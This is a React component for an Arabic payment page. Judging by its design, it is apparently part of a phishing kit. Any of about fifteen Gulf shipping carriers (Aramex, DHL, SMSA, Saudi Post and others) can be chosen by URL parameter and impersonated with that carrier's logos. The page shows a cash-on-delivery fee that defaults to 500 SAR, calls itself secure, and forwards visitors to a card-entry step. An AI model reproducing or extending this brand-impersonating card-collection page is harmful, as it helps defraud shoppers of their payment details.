import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, Shield, ArrowLeft, Hash, MapPin, DollarSign, User, Package, Truck } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const branding = getServiceBranding(serviceName);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
  };
  
  const heroImage = heroImages[serviceName.toLowerCase()] || heroBg;
  
  const handleProceed = () => {
    navigate(`/pay/${id}/card`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        amount={formattedAmount}
        title={`الدفع - ${serviceName}`}
        description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      />
      <div 
        className="min-h-screen bg-background" 
        dir="rtl"
      >
        {/* Hero Section */}
        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            {branding.logo && (
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
          
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
              {/* Header */}
              <div className="flex items-center justify-between mb-6 sm:mb-8">
                <h1 className="text-xl sm:text-3xl font-bold">تفاصيل الدفع</h1>
                
                <div
                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                  }}
                >
                  <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                </div>
              </div>
              
            {/* Shipping Info Display */}
            {shippingInfo && (
              <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
                <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
                <div className="space-y-2 text-xs sm:text-sm">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center gap-2">
                      <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                      <span className="text-muted-foreground">رقم الشحنة:</span>
                      <span className="font-semibold">{shippingInfo.tracking_number}</span>
                    </div>
                  )}
                  {shippingInfo.package_weight && (
                    <div className="flex items-center gap-2">
                      <Package className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                      <span className="text-muted-foreground">وزن الطرد:</span>
                      <span className="font-semibold">{shippingInfo.package_weight} كجم</span>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center gap-2">
                      <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                      <span className="text-muted-foreground">وصف الطرد:</span>
                      <span className="font-semibold">{shippingInfo.package_description}</span>
                    </div>
                  )}
                  {shippingInfo.cod_amount > 0 && (
                    <div className="flex items-center gap-2">
                      <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                      <span className="text-muted-foreground">مبلغ COD:</span>
                      <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
                    </div>
                  )}
                </div>
              </div>
            )}
            
              {/* Payment Summary */}
              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
                  <span className="text-muted-foreground">الخدمة</span>
                  <span className="font-semibold">{serviceName}</span>
                </div>
                
                <div 
                  className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
                  }}
                >
                  <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
                  <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
                    {formattedAmount}
                  </span>
                </div>
              </div>
            
              {/* Payment Method */}
              <div className="mb-6 sm:mb-8">
                <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
                <div 
                  className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
                  style={{
                    borderColor: branding.colors.primary,
                    background: `${branding.colors.primary}10`
                  }}
                >
                  <div className="flex items-center gap-2 sm:gap-3">
                    <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
                    <div>
                      <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
                      <p className="text-xs sm:text-sm text-muted-foreground">
                        Visa، Mastercard، Mada
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
            {/* Proceed Button */}
            <Button
              onClick={handleProceed}
              size="lg"
              className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              <span className="ml-2">الدفع بالبطاقة</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </Button>
          
            <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
              بالمتابعة، أنت توافق على الشروط والأحكام
            </p>
          </Card>
        </div>
      </div>
      </div>
    </>
  );
};

export default PaymentDetails;
